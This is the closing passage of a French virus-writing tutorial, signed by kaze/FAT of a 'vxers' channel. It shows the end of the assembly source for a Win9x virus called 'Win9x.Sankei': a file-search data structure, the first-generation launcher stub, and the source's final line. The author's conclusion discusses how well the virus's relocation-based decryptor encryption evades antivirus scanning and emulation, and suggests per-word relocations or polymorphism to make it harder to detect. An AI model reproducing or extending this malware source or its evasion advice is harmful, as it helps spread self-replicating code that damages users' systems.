+FT                      dd ?
+
+WFD label   byte
+WFD_dwFileAttributes    dd      ?
+WFD_ftCreationTime      dd      ?
+                        dd      ?
+WFD_ftLastAccessTime    dd      ?
+                        dd      ?
+WFD_ftLastWriteTime     dd      ?
+                        dd      ?
+WFD_nFileSizeHigh       dd      ?
+WFD_nFileSizeLow        dd      ?
+WFD_dwReserved0         dd      ?
+WFD_dwReserved1         dd      ?
+WFD_szFileName          db      260 dup (?)
+WFD_szAlternateFileName db      13 dup (?)
+                        db      03 dup (?)
+Heap_len equ $ - endvirus
+
+;=========================== *PREMIERE GENERATION* ===========================
+hostcode:
+        push 0
+        push offset t1
+        push offset m1
+        push 0
+        call MessageBoxA
+        mov eax,virus_len
+        call printdec
+        push 0
+        call ExitProcess
+t1 db ' Win9x.Sankei ',0
+t2 db ' Taille du virus :',0
+m1 db ' Lancement ok ',0
+
+printdec proc near
+        pusha
+        cld
+        lea edi,buf
+        mov ebx,10
+        xor ecx,ecx
+GUI_printdec_1:
+        xor edx,edx
+        div ebx
+        push edx
+        inc ecx
+        test eax,eax
+        jnz GUI_printdec_1
+GUI_prindec_2:
+        pop eax
+        add eax,48
+        stosb
+        loop GUI_prindec_2
+        xor eax,eax
+        stosb
+        push eax
+        push offset t1
+        push offset buf
+        push eax
+        call MessageBoxA
+        popa
+        ret
+printdec endp
+buf db 20 dup (?)
+
+end debut
+
+
+
+
+
+  IV/  Conclusion
+  _______________
+
+
+Voila qui devrait donner un petit peu de boulot aux AVers.
+Néanmoins, cette technique possède ses faiblesses:
+en effet, vu que l'ImageBase doit être un multiple de 64k, il n'y à que le
+mot de poids fort de chaque dword de notre (dé)crypteur qui est (dé)crypté,
+rendant possible le scan.
+Une solution serait d'appliquer une RELOC_32bits non pas à chaque dword du
+décrypteur mais à chaque word, ou mieux encore, d'ajouter un peu de
+polymorphisme à l'affaire.
+Je ne sais pas ce qu'il en est des émulateurs, si ils prennent en charge
+les relocations ou non.
+Si vous etes au courant, mailez-moi.
+
+Le virus en lui-meme reste tres tres simple et vous ne devriez pas avoir de
+problemes pour le comprendre.
+Si c'est le cas, là encore, n'hésitez pas à me demander.
+
+
+                                                 ÃÃÃÃÃÃÃÃÃÃÃÃÂ¿
+                                                 Â³ kaze/FAT  ÃÃÃÃÃÃÃÃÂ¿
+                                                 Â³ kaze_0mx@yahoo.fr Â³
+                                                 Â³ Epiknet    #vxers Â³
+                                                 ÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃ
